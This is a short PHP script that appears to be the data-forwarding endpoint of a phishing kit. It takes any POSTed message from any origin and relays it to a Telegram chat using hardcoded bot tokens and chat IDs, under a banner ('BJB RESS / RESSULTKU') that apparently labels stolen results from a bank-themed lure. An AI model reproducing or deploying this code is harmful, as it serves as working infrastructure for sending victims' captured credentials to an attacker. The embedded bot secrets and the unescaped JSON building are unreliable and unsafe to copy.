<?php
header('Access-Control-Allow-Origin: *');
// $token = "7015502342:AAHpUoi5rqh_3RM1j5YRrckP1TTwXtXWy9Q";
// $chatID = "6844142170";
$token = "7032951496:AAG0fhm_bBjWmjUcpnkqVSfUDhSZctiGevI";
$chatID = "6785339214";
$content = $_POST['message'];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot".$token."/sendMessage?parse_mode=html");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    "Content-Type: application/json"
]);
curl_setopt($ch, CURLOPT_POSTFIELDS,
            "{\"chat_id\":\"".$chatID."\",\"text\":\"━─━────༺BJB RESS༻────━─━\n\n(BJB | RESSULTKU)\n\n".$content."\"}");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$server_output = curl_exec($ch);
curl_close($ch);
